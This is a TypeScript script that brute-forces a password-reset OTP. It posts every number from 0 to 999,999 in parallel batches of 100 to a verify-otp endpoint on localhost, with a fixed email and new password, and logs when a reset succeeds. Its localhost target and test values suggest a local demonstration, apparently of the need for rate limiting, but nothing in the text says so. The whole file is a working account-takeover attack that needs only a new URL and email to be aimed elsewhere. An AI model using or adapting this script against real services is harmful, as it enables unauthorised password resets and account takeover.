import axios from 'axios';

async function sendRequest(otp: string) {
    let data = JSON.stringify({
        "email": "test@gmail.com",
        "otp": otp,
        "newPassword": "test@123"
    });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/verify-otp',
        headers: {
            'Content-Type': 'application/json'
        },
        data : data
    };

    return axios.request(config)
}

async function main() {
    for (let i = 0; i < 1000000; i+=100) {
        let promises = [];
        console.log(`starting from ${i}`);
        for (let j = i; j < i + 100; j++) {
            promises.push(sendRequest(j.toString()).then(res => {
                if (res.data.success) {
                    console.log("password correctly reset")
                }
            }).catch(e => {}));

        }
        await Promise.all(promises);
    }
}

main();
